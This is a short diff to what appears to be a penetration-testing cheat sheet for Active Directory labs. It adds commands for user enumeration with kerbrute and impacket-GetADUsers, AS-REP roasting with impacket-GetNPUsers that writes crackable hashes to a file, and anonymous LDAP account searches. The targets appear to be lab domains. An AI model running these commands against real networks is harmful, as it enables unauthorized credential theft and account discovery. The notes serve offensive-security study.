@@ -1,8 +1,11 @@
 #Enum users
 kerbrute userenum [USERFILE] --dc [IP] -d [Domain.com]
 
+#If you have a valid cred
+impacket-GetADUsers -all test.local/john:password123 -dc-ip 10.10.10.1
+
 #Enum user and their TGTs
-impacket-GetNPUsers -request -dc-ip 10.10.10.161 htb.local/
+impacket-GetNPUsers -dc-ip 10.10.65.161 spookysec.local/ -usersfile test -format john -outputfile hash.txt
 
 #Search user on ldpa
 ldapsearch -x -h 192.168.149.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
